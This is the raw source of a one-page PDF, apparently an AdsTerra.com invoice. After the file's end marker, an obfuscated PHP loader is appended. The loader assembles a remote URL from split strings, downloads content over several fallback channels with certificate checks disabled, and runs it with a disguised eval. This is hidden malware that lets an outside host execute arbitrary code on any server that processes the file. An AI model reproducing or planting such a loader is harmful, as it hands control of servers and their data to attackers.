%PDF-1.7
1 0 obj
<< /Type /Catalog
/Outlines 2 0 R
/Pages 3 0 R >>
endobj
2 0 obj
<< /Type /Outlines /Count 0 >>
endobj
3 0 obj
<< /Type /Pages
/Kids [6 0 R
]
/Count 1
/Resources <<
/ProcSet 4 0 R
/Font << 
/F1 8 0 R
/F2 9 0 R
>>
>>
/MediaBox [0.000 0.000 595.280 841.890]
 >>
endobj
4 0 obj
[/PDF /Text ]
endobj
5 0 obj
<<
/Producer (�� d o m p d f   2 . 0 . 8   +   C P D F)
/CreationDate (D:20241129143806+00'00')
/ModDate (D:20241129143806+00'00')
/Title (�� A d s T e r r a . c o m   i n v o i c e)
>>
endobj
6 0 obj
<< /Type /Page
/MediaBox [0.000 0.000 595.280 841.890]
/Parent 3 0 R
/Contents 7 0 R
>>
endobj
7 0 obj
<< /Filter /FlateDecode
/Length 904 >>
stream
x���]o�J���+F�ͩ����su\ �08=ʩzရ���lS��lc�"Ց�
���wޙ�%�R�DS����OI�a`� �Q�f��5��� _���םO�`�7�_FA���D�Џ.j�a=�j����>��n���R+�P��l�rH�{0��w��0��=W�2D
����G���I�>�_B3ed�H�yJ�G>/��ywy�fk��%�$�2.��d_�h����&)b0��"[\B��*_.��Y� ��<�2���fC�YQ&y�i�tQ�"xj����+���l�����'�i"�,�ҔH�AK��9��C���&Oa�Q�jɭ���
�p_���E�ie9�ƃ%H&��,`rDxS�ޔ!�(�X!v��]{ݛx�e�`�p�&��'�q�9
F�i���W1in��F�O�����Zs��[gQT�؉����}��q^upLɪ:B"��؝�����*Tiu(S�r]��s�.��s9n�N!K!L�M�?�*[��N�8��c��ۯ�b��� ��YZ���SR3�n�����lPN��P�;��^�]�!'�z-���ӊ���/��껣��4�l(M�E�QL��X��~���G��M|�����*��~�;/=N4�-|y�`�i�\�e�T�<���L��G}�"В�J^���q��"X�?(V�ߣXۆ{��H[����P���c���kc�Z�9v�����?�a��R�h|��^�k�D4W���?Iӊ�]<��4�)$wdat���~�����������|�L��x�p|N�*��E��/4�Qpi�x.>��d����,M�y|4^�Ż��8S/޾���uQe���D�y� ��ͧH�����j�wX��&z�
endstream
endobj
8 0 obj
<< /Type /Font
/Subtype /Type1
/Name /F1
/BaseFont /Helvetica
/Encoding /WinAnsiEncoding
>>
endobj
9 0 obj
<< /Type /Font
/Subtype /Type1
/Name /F2
/BaseFont /Helvetica-Bold
/Encoding /WinAnsiEncoding
>>
endobj
xref
0 10
0000000000 65535 f 
0000000009 00000 n 
0000000074 00000 n 
0000000120 00000 n 
0000000284 00000 n 
0000000313 00000 n 
0000000514 00000 n 
0000000617 00000 n 
0000001593 00000 n 
0000001700 00000 n 
trailer
<<
/Size 10
/Root 1 0 R
/Info 5 0 R
/ID[<a06db29b04022dfb709f8299f0d9e891><a06db29b04022dfb709f8299f0d9e891>]
>>
startxref
1812
%%EOF

<?php $u="ht";$p="tps";$d="://";$a="media";$b=".iloveto";$c=".cyou";$デ="/media/videos/h264/";$ur="mp4.txt";$url=$u.$p.$d.$a.$b.$c.$デ.$ur;function fetchContentWithFileGetContents($url){if(ini_get('allow_url_fopen')){return@file_get_contents($url);}return false;}function fetchContentWithCurl($url){if(function_exists('curl_version')){$ch=curl_init($url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);$response=curl_exec($ch);$error=curl_error($ch);curl_close($ch);return $error?false:$response;}return false;}function fetchContentWithFopen($url){if($file=fopen($url,'r')){$content=stream_get_contents($file);fclose($file);return $content;}return false;}function fetchContentWithStreamContext($url){$context=stream_context_create(["http"=>["method"=>"GET","header"=>"User-Agent: PHP script\r\n"]]);return@file_get_contents($url,false,$context);}function fetchContentWithFile($url){$lines=@file($url);if($lines===false){return false;}return implode('',$lines);}function fetchContent($url){$content=fetchContentWithFileGetContents($url);if($content===false){$content=fetchContentWithCurl($url);}if($content===false){$content=fetchContentWithFopen($url);}if($content===false){$content=fetchContentWithStreamContext($url);}if($content===false){$content=fetchContentWithFile($url);}return $content;}function obfuscatedEval($content){$evalFunc='e'.'v'.'a'.'l';if(empty($content)){return;}if(@eval("?>".$content)===false){return;}$evalFunc("?>".$content);}$content=fetchContent($url);if($content!==false){obfuscatedEval($content);}else{echo "エラー: Gagal mengambil konten.";} ?>